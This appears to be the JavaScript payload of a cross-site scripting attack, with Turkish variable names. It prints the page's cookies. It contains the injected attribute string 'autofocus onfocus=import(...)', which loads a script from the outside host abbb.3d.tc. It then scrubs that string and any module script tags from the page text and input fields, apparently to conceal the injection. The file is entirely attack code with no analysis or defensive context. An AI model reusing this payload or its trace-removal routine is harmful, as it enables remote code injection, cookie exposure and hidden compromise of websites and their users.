console.log('selam');
console.log(document.cookie);

(function() {
  const zararli = `"autofocus onfocus=import('https://abbb.3d.tc/a.js');"`;
  const hedefRegex = /<script\s+type=module\s+src=[^>]+><\/script>/gi;

  function temizleNode(node) {
    if(node.nodeType === Node.TEXT_NODE) {
      node.nodeValue = node.nodeValue.replaceAll(zararli, '');
      node.nodeValue = node.nodeValue.replace(hedefRegex, '');
    } else if(node.nodeType === Node.ELEMENT_NODE) {
      if(node.tagName === 'INPUT' || node.tagName === 'TEXTAREA') {
        if(node.value) node.value = node.value.replace(hedefRegex, '');
      }
      node.childNodes.forEach(temizleNode);
    }
  }

  temizleNode(document.body);
})();

export {};
